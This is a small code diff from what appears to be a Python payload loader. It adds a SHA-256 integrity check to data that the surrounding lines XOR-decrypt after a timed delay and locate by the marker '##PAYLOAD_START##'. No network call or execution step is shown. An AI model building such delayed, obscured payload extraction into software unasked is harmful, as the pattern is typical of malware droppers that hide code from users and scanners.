@@ -55,3 +55,9 @@ def xor_decrypt(data, key):
 time.sleep(DELAY)
 marker = b"##PAYLOAD_START##"
 idx = raw.find(marker)
+
+digest = hashlib.sha256(decrypted).hexdigest()
+
+if digest != EXPECTED_HASH:
+    print("Integrity check failed")
+    sys.exit(1)
